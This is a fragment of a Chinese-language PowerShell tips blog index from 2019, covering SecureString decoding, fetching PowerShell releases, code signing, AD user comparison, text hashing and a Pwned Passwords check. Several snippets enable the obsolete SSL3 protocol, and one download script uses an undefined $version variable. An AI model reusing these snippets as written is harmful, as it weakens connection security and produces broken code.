this Tip!","link":"/2019/04/26/real-time-processing-for-language-structures/"},{"title":"PowerShell 技能连载 - 将 SecureString 转换为字符串","text":"有些时候需要将 SecureString 转换为普通字符串，例如因为您使用了由 Read-Host 提供的安全输入： 1$secret = Read-Host -Prompt 'Enter Keypass' -AsSecureString 这将提示用户输入密码，并且输入的内容将变为一个 SecureString： 12PS&gt; $secretSystem.Security.SecureString 要将它还原为纯文本，请使用 SecureString 来创建一个 PSCredential 对象，它包含了一个解密密码的方法： 12$secret = Read-Host -Prompt 'Enter Keypass' -AsSecureString[System.Management.Automation.PSCredential]::new('hehe',$secret).GetNetworkCredential().Password","link":"/2019/04/29/converting-securestring-to-string/"},{"title":"PowerShell 技能连载 - PowerShell ISE 模块浏览器","text":"如果您在使用内置的 PowerShell ISE，您也许发现 “Module Browser Add-on” 很有用。它十分古老了，是 2015 年发布的，然而您可以方便滴从 PowerShell Gallery 中下载安装它： 1PS C:\\&gt; Install-Module ISEModuleBrowserAddOn -Repository PSGallery -Scope CurrentUser 当这个模块安装好，您就可以这样将它加载到 PowerShell ISE 中： 1PS C:\\&gt; Import-Module -Name ISEModuleBrowserAddon -Verbose 这将在 PowerShell 的右侧打开一个新的 Add-on 面板，其中有三个类别：Gallery，Favorites，以及 My Collection。 “Gallery” 将您连接到在线的 PowerShell Gallery，最初创建该库是为了帮助更容易地发现 PowerShell Gallery 中的在线内容。不过这部分看上去不能工作了。 不过当您点击 “My Collection” 时，将会获取到所有模块，并且当您双击列表中的一个模块时，可以获取模块中的内容，例如包含的命令。您也可以讲一个模块标注为 “Favorite”（它就会出现在 “Favorites” 列表中），卸载一个模块，或通过模块列表底部的按钮打开它。 通过顶部的 “New Module” 按钮，您可以创建一个新的空白 PowerShell 模块：一个向导将引导您完成采集元数据并将建有关文件的所有步骤。","link":"/2019/04/30/powershell-ise-module-browser/"},{"title":"PowerShell 技能连载 - 查找最新的 PowerShell 6 发布","text":"PowerShell 6 是开源的，所以经常发布新的更新。您随时可以访问 https://github.com/PowerShell/PowerShell/releases 来查看这些更新。 对于 PowerShell 来说，可以使这步操作自动化。以下是一小段读取 GitHub 发布的 RSS 供稿的代码，它能够正确地转换数据，然后取出这些更新以及下载信息，并按降序排列： 12345$AllProtocols = [Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'[Net.ServicePointManager]::SecurityProtocol = $AllProtocols $Updated = @{ Name = 'Updated' Expression = { $_.Updated -as [DateTime] }}$Link = @{ Name = 'URL' Expression = { $_.Link.href }}Invoke-RestMethod -Uri https://github.com/PowerShell/PowerShell/releases.atom -UseBasicParsing | Sort-Object -Property Updated -Descending | Select-Object -Property Title, $Updated, $Link 结果类似这样： title Updated URL ----- ------- --- v6.2.0 Release of PowerShell Core 28.03.2019 19:52:27 https://github.com/PowerShell/PowerShell/releases/tag/v6.2.0 v6.2.0-rc.1 Release of PowerShell Core 05.03.2019 23:47:46 https://github.com/PowerShell/PowerShell/releases/tag/v6.2.0-rc.1 v6.1.3 Release of PowerShell Core 19.02.2019 19:32:01 https://github.com/PowerShell/PowerShell/releases/tag/v6.1.3 v6.2.0-preview.4 Release of PowerShell Core 28.01.2019 22:28:01 https://github.com/PowerShell/PowerShell/releases/tag/v6.2.0-preview.4 v6.1.2 Release of PowerShell Core 15.01.2019 21:02:39 https://github.com/PowerShell/PowerShell/releases/tag/v6.1.2 v6.2.0-preview.3 Release of PowerShell Core 11.12.2018 01:29:33 https://github.com/PowerShell/PowerShell/releases/tag/v6.2.0-preview.3 v6.2.0-preview.2 Release of PowerShell Core 16.11.2018 02:52:53 https://github.com/PowerShell/PowerShell/releases/tag/v6.2.0-preview.2 v6.1.1 Release of PowerShell Core 13.11.2018 20:55:45 https://github.com/PowerShell/PowerShell/releases/tag/v6.1.1 v6.0.5 Release of PowerShell Core 13.11.2018 19:00:56 https://github.com/PowerShell/PowerShell/releases/tag/v6.0.5 v6.2.0-preview.1 Release of PowerShell Core 18.10.2018 02:07:32 https://github.com/PowerShell/PowerShell/releases/tag/v6.2.0-preview.1 请注意，只有在 Windows 10 1803 之前才需要显式启用 SSL。","link":"/2019/05/03/finding-latest-powershell-6-release/"},{"title":"PowerShell 技能连载 - 查找最新的 PowerShell 6 发行信息（以及下载地址）","text":"PowerShell 6 是开源的并且在 GitHub 上维护了一个公共的仓库。在仓库中频繁发行新版本。 如果您不希望深入到 GitHub 的前端来获取最新版 PowerShell 6 发行的下载地址，那么可以采用这个 PowerShell 的方法： 1234567891011$AllProtocols = [Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'[Net.ServicePointManager]::SecurityProtocol = $AllProtocols# get all releasesInvoke-RestMethod -Uri https://github.com/PowerShell/PowerShell/releases.atom -UseBasicParsing | # sort in descending order Sort-Object -Property Updated -Descending | # pick the first (newest) release and get a link Select-Object -ExpandProperty Link -First 1 | # pick a URL Select-Object -ExpandProperty HRef （请注意只有在 Windows 10 1803 之前才需要显式启用 SSL。） 这将货渠道最新的 PowerShell 发行页面的 URL。在页面中，您可以获取到不同平台的下载地址。 不过，还有一个更简单的方法：访问 https://github.com/PowerShell/PowerShell/releases/latest 然而，这并不能提供 URL 和标签信息。而只是被跳转到一个对应的 URL。 以下是两者的混合：使用最新发行版的快捷方式，但是不允许跳转。通过这种方式，PowerShell 将返回完整的 URL： 12345678910111213141516171819$AllProtocols = [Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'[Net.ServicePointManager]::SecurityProtocol = $AllProtocols# add a random number to the URL to trick proxies$url = &quot;https://github.com/PowerShell/PowerShell/releases/latest?dummy=$(Get-Random)&quot;$request = [System.Net.WebRequest]::Create($url)# do not allow to redirect. The result is a &quot;MovedPermanently&quot;$request.AllowAutoRedirect=$false# send the request$response = $request.GetResponse()# get back the URL of the true destination page, and split off the version$realURL = $response.GetResponseHeader(&quot;Location&quot;)# make sure to clean up$response.Close()$response.Dispose()$realURL","link":"/2019/05/02/finding-latest-powershell-6-release-and-download-urls/"},{"title":"PowerShell 技能连载 - 查找最新的 PowerShell 6 下载地址","text":"PowerShell 6 是开源的，所以经常发布新的更新。以下是如何查找最新的 PowerShell 6 发布地址的方法： 123456789101112131415161718192021$AllProtocols = [Net.SecurityProtocolType]'Ssl3,Tls,Tls11,Tls12'[Net.ServicePointManager]::SecurityProtocol = $AllProtocols# get the URL for the latest PowerShell 6 release$url = &quot;https://github.com/PowerShell/PowerShell/releases/latest?dummy=$(Get-Random)&quot;$request = [System.Net.WebRequest]::Create($url)$request.AllowAutoRedirect=$false$response = $request.GetResponse()$realURL = $response.GetResponseHeader(&quot;Location&quot;)$response.Close()$response.Dispose()# get the current version from that URL$v = ($realURL -split '/v')[-1]# create the download URL for the release of choice# (adjust the end part to target the desired platform, architecture, and package format)$platform = &quot;win-x64.zip&quot;$static = &quot;https://github.com/PowerShell/PowerShell/releases/download&quot;$url = &quot;$static/v$version/PowerShell-$version-$platform&quot; 这段代码生成 ZIP 格式的 64 位 Windows 版下载链接。如果您需要不同的发行版，只需要调整 $platform 中定义的平台部分。 当获得了下载链接，您可以通过它自动完成剩下的步骤：下载 ZIP 文件，取消禁用并解压，然后执行 PowerShell 6: 1234567891011121314151617# define the place to download to$destinationFile = &quot;$env:temp\\PS6\\powershell6.zip&quot;$destinationFolder = Split-Path -Path $destinationFile# create destination folder if it is not present$existsDestination = Test-Path -Path $destinationFolderif ($existsDestination -eq $false){ $null = New-Item -Path $destinationFolder -Force -ItemType Directory}# download fileInvoke-WebRequest -Uri $url -OutFile $destinationFile# unblock downloaded fileUnblock-File -Path $destinationFile# extract fileExpand-Archive -Path $destinationFile -DestinationPath $destinationFolder -Force 最终，在桌面上创建一个快捷方式，指向 PowerShell 6 这样可以快捷地启动 shell： 1234567891011# place a shortcut on your desktop$path = &quot;$Home\\Desktop\\powershell6.lnk&quot;$obj = New-Object -ComObject WScript.Shell$scut = $obj.CreateShortcut($path)$scut.TargetPath = &quot;$destinationFolder\\pwsh.exe&quot;$scut.IconLocation = &quot;$destinationFolder\\pwsh.exe,0&quot;$scut.WorkingDirectory = &quot;$home\\Documents&quot;$scut.Save()# run PowerShell 6Invoke-Item -Path $path","link":"/2019/05/03/finding-the-latest-powershell-6-download-url/"},{"title":"PowerShell 技能连载 - 查找 PowerShell 命名管道","text":"每个运行 PowerShell 5 以及以上版本的 PowerShell 宿主都会打开一个能被检测到的“命名管道”。以下代码检测这些命名管道并返回暴露这些管道的进程： 1234Get-ChildItem -Path &quot;\\\\.\\pipe\\&quot; -Filter '*pshost*' |ForEach-Object { Get-Process -Id $_.Name.Split('.')[2]} 结果看起来类似这样： Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName ------- ------ ----- ----- ------ -- -- ----------- 1204 98 306220 66620 63,30 28644 1 powershell_ise 525 29 72604 12708 5,64 12188 1 powershell 741 41 125728 142656 11,52 27144 1 powershell 835 61 40836 82624 1,44 22412 1 pwsh 820 49 199680 230632 2,86 26500 1 powershell_ise 这里列出的每个进程都启动了一个 PowerShell 运行空间。您可以使用 Enter-PSHostProcess -Id XXX 来连接到 PowerShell 进程（假设您有本地管理员特权）。","link":"/2019/05/06/finding-powershell-named-pipes/"},{"title":"PowerShell 技能连载 - 使用目录文件来维护文件夹完整性","text":"如果您希望确保一个文件夹的内容保持不变，那么可以使用目录文件。目录文件可以列出所有文件夹内容并为文件夹中的每个文件创建哈希。以下是一个例子： 1234567# path to folder to create a catalog file for# (make sure it exists and isn't too large)$path = &quot;$Home\\Desktop&quot;# path to catalog file to be created$catPath = &quot;$env:temp\\myDesktop.cat&quot;# create catalogNew-FileCatalog -Path $path -CatalogVersion 2.0 -CatalogFilePath $catPath 根据文件夹的大小，可能需要一些时间来创建目录文件。您无法创建被锁定和在使用中的文件的目录。生成的目录文件是一个二进制文件并且包含目录中所有文件的哈希。 要检查文件夹是否未被该国，您可以使用 Test-FileCatalog 命令： 12345678PS&gt; Test-FileCatalog -Detailed -Path $path -CatalogFilePath $catPathStatus : ValidHashAlgorithm : SHA256CatalogItems : {...}PathItems : {...}Signature : System.Management.Automation.Signature 如果文件夹内容和目录相匹配，那么结果状态为 “Valid”。否则，CatalogItems 属性将包含一个文件夹中所有内容的详细列表，以及它们是否变更过的标志。","link":"/2019/05/07/using-catalog-files-to-maintain-folder-integrity/"},{"title":"PowerShell 技能连载 - 创建代码签名证书","text":"Windows 10 和 Serve 2016（以及更高版本）带有一个高级的 New-SelfSignedCert cmdlet，它可以用来创建代码签名证书。通过代码签名证书，您可以对 PowerShell 脚本进行数字签名并使用这个签名来检测用户是否改篡改过脚本内容。 以下是一个用来创建代码签名证书的函数： 12345678910111213141516function New-CodeSigningCert{ param ( [Parameter(Mandatory, Position=0)] [System.String] $FriendlyName, [Parameter(Mandatory, Position=1)] [System.String] $Name ) # Create a certificate: New-SelfSignedCertificate -KeyUsage DigitalSignature -KeySpec Signature -FriendlyName $FriendlyName -Subject &quot;CN=$Name&quot; -KeyExportPolicy ExportableEncrypted -CertStoreLocation Cert:\\CurrentUser\\My -NotAfter (Get-Date).AddYears(5) -TextExtension @('2.5.29.37={text}1.3.6.1.5.5.7.3.3')} 要创建一个新的证书，请运行这行代码： 12345678PS&gt; New-CodeSigningCert -FriendlyName TobiasWeltner -Name TWeltner PSParentPath: Microsoft.PowerShell.Security\\Certificate::CurrentUser\\MyThumbprint Subject---------- -------2350D77A4CACAF17136B94D297DEB1A5E413655D CN=TWeltner 使用新的代码签名证书，您可以对脚本进行数字签名。代码签名证书位于个人证书存储中。要使用它，需要先从存储中读取它： 12$cert = Get-ChildItem -Path Cert:\\CurrentUser\\My -CodeSigningCert | Out-GridView -Title 'Select Certificate' -OutputMode Single 要签名一个单独的脚本，请使用这行代码： 123$Path = &quot;C:\\path\\to\\your\\script.ps1&quot;Set-AuthenticodeSignature -Certificate $cert -FilePath $Path 如果您希望通过时间戳签名，请使用这行代码： 1Set-AuthenticodeSignature -Certificate $cert -TimestampServer http://timestamp.digicert.com -FilePath $Path 当签名使用的证书过期以后，时间戳签名仍然有效。 要批量签名多个脚本，请使用 Get-ChildItem 并用管道将文件传送到 Set-AuthenticodeSignature。这行代码将对用户配置文件中的所有 PowerShell 脚本签名： 12Get-ChildItem -Path &quot;$home\\Documents&quot; -Filter *.ps1 -Include *.ps1 -Recurse |Set-AuthenticodeSignature -Certificate $cert 当您得到了签名后的脚本，随时可以使用 Get-AuthenticodeSignature 来检查签名的完整性： 12Get-ChildItem -Path &quot;$home\\Documents&quot; -Filter *.ps1 -Include *.ps1 -Recurse |Get-AuthenticodeSignature","link":"/2019/05/08/creating-code-signing-certificates/"},{"title":"PowerShell 技能连载 - 导出和导入代码签名证书","text":"在前面的技能里我们解释了如何在 Windows 10 和 Server 2016（以及更高的版本）中创建自签名的代码签名证书。今天，我们来看看如何导出这些证书，创建一个密码保护的文件，然后在不同的机器上再次使用这些证书。 假设您已经在个人证书存储中创建了一个新的代码签名证书，或者在您的证书存储中有一个来自其它来源的代码签名证书。这段代码会将证书导出为一个 PFX 文件放在桌面上： 123456789# this password is required to be able to load and use the certificate later$Password = Read-Host -Prompt 'Enter Password' -AsSecureString# certificate will be exported to this file$Path = &quot;$Home\\Desktop\\myCert.pfx&quot;# certificate must be in your personal certificate store$cert = Get-ChildItem -Path Cert:\\CurrentUser\\My -CodeSigningCert | Out-GridView -Title 'Select Certificate' -OutputMode Single$cert | Export-PfxCertificate -Password $Password -FilePath $Path 导出的过程中将会让您输入密码。由于代码签名证书是安全相关的，所以将使用密码来加密存储在 PFX 文件中的证书，并且等等加载证书的时候将需要您输入这个密码。 下一步，将在一个网格视图窗口中显示您个人证书存储中所有的代码签名证书。请选择一个您想导出的证书。 当创建了一个 PFX 文件，您可以用这行命令加载： 12$cert = Get-PfxCertificate -FilePath $Path$cert | Select-Object -Property * Get-PfxCertificate 将会让您输入创建 PFX 文件时所输入的密码。当证书加载完，您可以执行 Set-AuthenticodeSignature 用它来签名文件。","link":"/2019/05/09/exporting-and-importing-code-signing-certificates/"},{"title":"PowerShell 技能连载 - 对比 AD 用户","text":"您是否曾希望对比 ADUser 的属性？假设您安装了 RSAT 工具，您可以用 Get-ADUser 读取每个 AD 用户，但是对比它们的属性不那么容易。 除非使用以下函数：它基本上是将 AD 用户属性分割成独立的对象，这样便可以使用 Compare-Object： 123456789101112131415161718192021222324252627282930313233343536373839404142#requires -Version 3.0 -Modules ActiveDirectoryfunction Compare-User{ param ( [Parameter(Mandatory)][String] $User1, [Parameter(Mandatory)][String] $User2, [String[]] $Filter =$null ) function ConvertTo-Object { process { $user = $_ $user.PropertyNames | ForEach-Object { [PSCustomObject]@{ Name = $_ Value = $user.$_ Identity = $user.SamAccountName } } } } $l1 = Get-ADUser -Identity $User1 -Properties * | ConvertTo-Object $l2 = Get-ADUser -Identity $User2 -Properties * | ConvertTo-Object Compare-Object -Ref $l1 -Dif $l2 -Property Name, Value | Sort-Object -Property Name | Where-Object { $Filter -eq $null -or $_.Name -in $Filter }} 以下是输出可能看起来的样子： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566PS C:\\&gt; Compare-User -User1 student1 -User2 administratorName Value---- -----accountExpires 0accountExpires 9223372036854775807badPasswordTime 131977150131836679badPasswordTime 131986685447368488CanonicalName CCIE.LAN/Users/AdministratorCanonicalName CCIE.LAN/Users/student1CN AdministratorCN student1Created 08.03.2019 10:31:50Created 02.04.2019 09:13:17createTimeStamp 08.03.2019 10:31:50createTimeStamp 02.04.2019 09:13:17Description Built-in account for administering the computer/domainDescriptionDistinguishedName CN=student1,CN=Users,DC=CCIE,DC=LANDistinguishedName CN=Administrator,CN=Users,DC=CCIE,DC=LANdSCorePropagationData ...2019 10:47:56, 08.03.2019 10:32:47, 01.01.1601 19:12:16}dSCorePropagationData {02.04.2019 09:15:28, 01.01.1601 01:00:00}isCriticalSystemObject TrueLastBadPasswordAttempt 22.03.2019 08:56:53LastBadPasswordAttempt 02.04.2019 10:49:04lastLogon 131986622819726136lastLogon 131986685566131171LastLogonDate 02.04.2019 10:34:39LastLogonDate 02.04.2019 09:04:41lastLogonTimestamp 131986622819726136lastLogonTimestamp 131986676794218709logonCount 177logonCount 4logonHours {255, 255, 255, 255...}MemberOf ...CIE,DC=LAN, CN=Schema Admins,CN=Users,DC=CCIE,DC=LAN...}MemberOf ...C=CCIE,DC=LAN, CN=Domain Admins,CN=Users,DC=CCIE,DC=LAN}Modified 03.04.2019 11:26:30Modified 02.04.2019 09:04:41modifyTimeStamp 03.04.2019 11:26:30modifyTimeStamp 02.04.2019 09:04:41msDS-User-Account-Control-Computed 8388608msDS-User-Account-Control-Computed 0Name AdministratorName student1ObjectGUID 6f5d7164-33cf-440a-af8c-3e973a1f381aObjectGUID ffe12d2d-cfdd-41f6-8268-41c493786f90objectSid S-1-5-21-2389183542-1750168592-3050041687-500objectSid S-1-5-21-2389183542-1750168592-3050041687-1128PasswordExpired TruePasswordExpired FalsePasswordLastSetPasswordLastSet 08.03.2019 09:41:25pwdLastSet 0pwdLastSet 131965080857557947SamAccountName student1SamAccountName AdministratorSID S-1-5-21-2389183542-1750168592-3050041687-1128SID S-1-5-21-2389183542-1750168592-3050041687-500uSNChanged 25764uSNChanged 24620uSNCreated 24653uSNCreated 8196whenChanged 02.04.2019 09:04:41whenChanged 03.04.2019 11:26:30whenCreated 08.03.2019 10:31:50whenCreated 02.04.2019 09:13:17 还可以只输出需要的属性： 12345678910PS C:\\&gt; Compare-User -User1 student1 -User2 administrator -Filter memberof, lastlogontime, logonCount, NameName Value---- -----logonCount 177logonCount 4MemberOf ...ise Admins,CN=Users,DC=CCIE,DC=LAN, CN=Schema Admins,CN=Users,DC=CCIE,DC=LAN...}MemberOf ...LAN, CN=Test1,CN=Users,DC=CCIE,DC=LAN, CN=Domain Admins,CN=Users,DC=CCIE,DC=LAN}Name AdministratorName student1","link":"/2019/05/10/compare-ad-user/"},{"title":"PowerShell 技能连载 - 将 PowerShell 输出重定向到 GridView","text":"当在 PowerShell 中输出数据时，它会静默地通过管道输出到 Out-Default 并且最终以文本的方式输出到控制台。如果我们覆盖 Out-Default，就可以改变它的行为，例如将所有 PowerShell 的输出改到一个网格视图窗口。实际中，您甚至可以区别对待正常的输出和错误信息，并且将两者显示在不同的窗口里。 以下是两个函数：Enable-GridOutput 和 Disable-GridOutput。当您运行 Enable-GridOutput 时，它会覆盖 Out-Default 并将常规的输出显示在 “Output” 网格视图窗口，并且将错误信息转换为有用的文本，并将它输出到一个独立的 “Error” 网格视图窗口。 当运行 Disable-GridOutput 后，会去掉覆盖的效果，并且回到缺省的行为： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758function Enable-GridOutput{ function global:Out-Default { param ( [Parameter(ValueFromPipeline=$true)][Object] $InputObject ) begin { $cmd = $ExecutionContext.InvokeCommand. GetCommand('Microsoft.PowerShell.Utility\\Out-GridView', [Management.Automation.CommandTypes]::Cmdlet) $p1 = {&amp; $cmd -Title 'Output' }. GetSteppablePipeline($myInvocation.CommandOrigin) $p2 = {&amp; $cmd -Title 'Error' }. GetSteppablePipeline($myInvocation.CommandOrigin) $p1.Begin($PSCmdlet) $p2.Begin($PSCmdlet) } process { if ($_ -is [Management.Automation.ErrorRecord]) { $info = $_ | ForEach-Object { [PSCustomObject]@{ Exception = $_.Exception.Message Reason = $_.CategoryInfo.Reason Target = $_.CategoryInfo.TargetName Script = $_.InvocationInfo.ScriptName Line = $_.InvocationInfo.ScriptLineNumber Column = $_.InvocationInfo.OffsetInLine } } $p2.Process($info) } else { $p1.Process($_) } } end { $p1.End() $p2.End() } }}function Disable-GridOutput{ Remove-Item -Path function:Out-Default -ErrorAction SilentlyContinue}","link":"/2019/05/13/redirecting-powershell-output-to-gridview/"},{"title":"PowerShell 技能连载 - 美化 Out-GridView 对话框","text":"当您用管道将对象输出到 Out-GridView，该 cmdlet 显示缺省的属性，所以当您用一个网格视图窗口当作选择框时，您可以控制用户可见的内容。以下代码将读取前 10 个 AD 用户输出到网格视图窗口，并且用户可以选择要返回的项。然而，网格视图窗口中显示的数据看起来很丑： 123Get-ADUser -ResultSetSize 10 -Filter * | Out-GridView -Title 'Select-User' -OutputMode Single | Select-Object -Property * 如果您没有使用 AD 或没有安装 RSAT 工具，以下是使用进程的类似的例子： 1234Get-Process | Where-Object MainWindowTitle | Out-GridView -Title 'Which process do you want to kill?' -OutputMode Single | Stop-Process -WhatIf 如果您使用 Select-Object 来限制显示的属性，这将改变对象的类型，所以当您继续用管道将改变过的对象传给下一级 cmdlet，它们将无法处理返回的对象。 解决方法是保持对象类型不变，而是改变缺省属性。以下是 AD 用户对象的解决方案，在选择对话框中只显示 Name 和 SID： 123456789[string[]]$visible = 'Name', 'SID'$type = 'DefaultDisplayPropertySet'[Management.Automation.PSMemberInfo[]]$i =New-Object System.Management.Automation.PSPropertySet($type,$visible)Get-ADUser -LDAPFilter '(samaccountname=schul*)' | Add-Member -MemberType MemberSet -Name PSStandardMembers -Value $i -Force -PassThru | Out-GridView -Title 'Select-User' -OutputMode Single | Select-Object -Property * 这是进程选择框的解决方案，显示进程的名称、公司、起始时间，和窗体标题： 123456789101112131415[string[]]$visible = 'Name', 'Company','StartTime','MainWindowTitle'$type = 'DefaultDisplayPropertySet'[Management.Automation.PSMemberInfo[]]$i =New-Object System.Management.Automation.PSPropertySet($type,$visible)Get-Process | Where-Object MainWindowTitle | Sort-Object -Property Name | # important: object clone required Select-Object -Property * | Add-Member -MemberType MemberSet -Name PSStandardMembers -Value $i -Force -PassThru | Out-GridView -Title 'Which process do you want to kill?' -OutputMode Single | Stop-Process -WhatIf 结果发现，进程对象不接受新的 DefaultDisplayPropertySet，所以在这个例子中需要一个完整的克隆，这样您可以用 Select-Object -Property * 将对象输出到管道。由于这不会改变对象类型，所以所有原始属性都被保留下来，下游管道命令能继续起作用，因为管道绑定仍然有效。","link":"/2019/05/14/pretty-out-gridview-dialog-boxes/"},{"title":"PowerShell 技能连载 - 从文本创建哈希","text":"哈希是一种唯一确定一段文本而不用暴露原始文本的棒法。哈希被用来确定文本、查找重复的文件内容，以及验证密码。PowerShell 5 以及更高版本甚至提供了一个 cmdlet 来计算文件的哈希值：Get-FileHash。 然而，Get-FileHash 不能计算字符串的哈希。没有必要只是为了计算哈希值而将字符串保存到文件。您可以使用所谓的内存流来代替。以下是一段从任何字符串计算哈希值的代码片段： 12345678$Text = 'this is the text that you want to convert into a hash'$stream = [IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($Text))$hash = Get-FileHash -InputStream $stream -Algorithm SHA1$stream.Close()$stream.Dispose()$hash 使用完成后别忘了关闭并释放内存流，防止内存泄漏并释放所有资源。","link":"/2019/05/16/creating-hashes-from-text/"},{"title":"PowerShell 技能连载 - 获取文本的哈希值","text":"在 PowerShell 5（以及 Get-FileHash 之前），要计算字符串和文件的哈希值，您需要借助原生的 .NET 方法。以下是一段为一个字符串创建 MD5 哈希的示例代码： 1234567891011$Text = 'this is the text that you want to convert into a hash'$Provider = New-Object -TypeName Security.Cryptography.MD5CryptoServiceProvider$Encodiner = New-Object -TypeName Text.UTF8Encoding$Bytes = $Encodiner.GetBytes($Text)$hashBytes = $Provider.ComputeHash($Bytes)$hash = [System.BitConverter]::ToString($hashBytes)# remove dashes if needed$hash -replace '-' 如果您需要计算一个文件内容的哈希值，要么使用 Get-Content 来读取文件，或者使用以下代码： 1234567891011$Path = &quot;C:\\somefile.txt&quot;# use your current PowerShell host as a sample$Path = Get-Process -Id $Pid | Select-Object -ExpandProperty Path$Provider = New-Object -TypeName Security.Cryptography.MD5CryptoServiceProvider$FileContent = [System.IO.File]::ReadAllBytes($Path)$hashBytes = $Provider.ComputeHash($FileContent)$hash = [System.BitConverter]::ToString($HashBytes)$hash -replace '-'","link":"/2019/05/17/get-hashes-from-texts/"},{"title":"PowerShell 技能连载 - 以固定宽度分割文本","text":"假设您需要以固定宽度分割一段文本。例如，如果您需要一段文本的前 5 个字符，以及剩余的部分，如何实现它？ 大多数 PowerShell 用户可能会用类似这样的方法： 1$text = 'ID12:Here is the text'$prefix = $text.Substring(0,5)$suffix = $text.Substring(5)$prefix$suffix 当然，如果用分割字符，例如 “:”，可以这样操作： 1$prefix, $suffix = 'ID12:Here is the text' -split ':'$prefix$suffix 然而，这将会吃掉分割字符，并且它会导致超过两个部分。这不是我们要的目标：用固定宽度分割一段文本。而您仍然可以使用 -split 操作符： 1$prefix, $suffix = 'ID12:Here is the text' -split '(?&lt;=^.{5})'$prefix$suffix 正则表达式结构 “(?&lt;=XXX)“ 称为“向后引用”。”^“ 代表文本的开始，而 “.“ 代表任何字符。如您猜测的那样，”{5}“ 限定该占位符出现的次数，所以基本上这个正则表达式从剩下的文本中分割出前 5 个字符并且返回两部分（假设文本至少 6 个以上字符长度）。","link":"/2019/05/18/splitting-texts-by-fixed-width/"},{"title":"PowerShell 技能连载 - 在 PowerShell 中使用 SSL&#x2F;HTTPS","text":"根据您的 PowerShell、.NET Framework 的版本和升级，WEB 连接的缺省安全协议可能仍然是 SSL3。您可以方便地查明它： 1[Net.ServicePointManager]::SecurityProtocol 如果返回的协议不包含 Tls12，那么您可能无法用 PowerShell 连接到安全的 Web Service 和网站。我们只需要这样操作就可以启用更多的服务： 12[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3 -bor [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12[Net.ServicePointManager]::SecurityProtocol","link":"/2019/05/20/using-ssl-https-from-powershell/"},{"title":"PowerShell 技能连载 - 用聪明的方法指定位标志","text":"在前一个技能中我们学习了如何在 PowerShell 中启用所有的 SSL 安全协议来连接到 Web Service 和 网站： 1[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Ssl3 -bor [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12 有趣的是，可以用一行更短的代码来代替： 1[Net.ServicePointManager]::SecurityProtocol = 'Ssl3, Tls, Tls11, Tls12' 以下是它的原因： 由于 SecurityProtocol 是 Net.SecurityProtocolType 类型的，所以当您传入字符串数据，它可以自动转换： 12PS&gt; [Net.ServicePointManager]::SecurityProtocol.GetType().FullNameSystem.Net.SecurityProtocolType 与其用 SecurityProtocolType 枚举并且用 -bor 操作符来连接，您还可以用比特标志位的名称组成的逗号分隔的字符串。两者是相同的： 1234567$a = [Net.SecurityProtocolType]::Ssl3 -bor [Net.SecurityProtocolType]::Tls -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls12$b = [Net.SecurityProtocolType]'Ssl3, Tls, Tls11, Tls12'PS&gt; $a -eq $bTrue","link":"/2019/05/21/specifying-bit-flags-smart/"},{"title":"PowerShell 技能连载 - 检查坏（不安全的）密码（第 1 部分）","text":"复杂的密码不一定安全。例如，”P@ssw0rd” 是一个非常复杂的密码，但是非常不安全。这是为什么安全社区开始建议用更相关的测试取代复杂性标准，并防止使用以前黑客入侵中使用过的密码。这些密码——虽然它们可能很复杂——是字典攻击的一个常规部分并且非常不安全。 如何知道某个密码是否已被泄露？您可以使用类似 haveibeenpwnd.com 的网站或者它们的 API。这是它的工作原理： 您根据密码创建哈希值，这样就不会泄漏您的密码。 将哈希的头五个字节发送到 API，这样就不会泄漏哈希值。 您可以获得所有以这五个字节开头的哈希值。 检查返回的哈希中是否有您密码的哈希值。 以下是用 PowerShell 检查密码的方法： 123456789101112131415161718192021222324252627# enable all SSL protocols[Net.ServicePointManager]::SecurityProtocol = 'Ssl3,Tls, Tls11, Tls12'# get password hash$stream = [IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($Password))$hash = Get-FileHash -InputStream $stream -Algorithm SHA1$stream.Close()$stream.Dispose()# find first five and subsequent hash characters$prefix, $suffix = $hash.Hash -split '(?&lt;=^.{5})'# ask for matching passwords with the same first 5 hash digits$url = &quot;https://api.pwnedpasswords.com/range/$prefix&quot;$response = Invoke-RestMethod -Uri $url -UseBasicParsing# find the exact match$lines = $response -split '\\r\\n'$seen = foreach ($line in $lines){ if ($line.StartsWith($suffix)) { [int]($line -split ':')[-1] break }}&quot;$Password has been seen {0:n0} times.&quot; -f $seen 试着改变 $Password 中的密码来测试这段代码。您会很惊讶地发现许多密码已经泄漏： Sunshine has been seen 13.524 times.","link":"/2019/05/22/checking-for-bad-insecure-passwords-part-1/"},{"title":"PowerShell 技能连载 - 检查坏（不安全的）密码（第 2 部分）","text":"在前一个技能中我们解释了如何用 Web Service 来安全地检测密码并且查明它们是否已被泄漏。 信息安全有关的代码有时经过压缩后看起来是否“有趣”，所以在第一步分钟我们分享了优美的而且可读的代码。而以下是考虑“信息安全”的变体，它展示 PowerShell 代码可以被压缩到什么程度并且可以自动混淆。这段代码返回一个指定的密码被暴露了多少次（如果未曾发现被暴露过，返回 null）。 1$p = 'P@ssw0rd'[Net.ServicePointManager]::SecurityProtocol = 'Tls12'$a,$b = (Get-FileHash -A 'SHA1' -I ([IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($p)))).Hash -split '(?&lt;=^.{5})'(((irm &quot;https://api.pwnedpasswords.com/range/$a&quot; -UseB) -split '\\r\\n' -like &quot;$b*&quot;) -split ':')[-1","link":"/2019/05/23/checking-for-bad-insecure-passwords-part-2/"},{"title":"PowerShell 技能连载 - 控制音量和静音状态","text":"要调节音量以及静音、取消扬声器的静音，PowerShell 可以像这样用 C# 代码来操作 API： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253Add-Type -TypeDefinition @'using 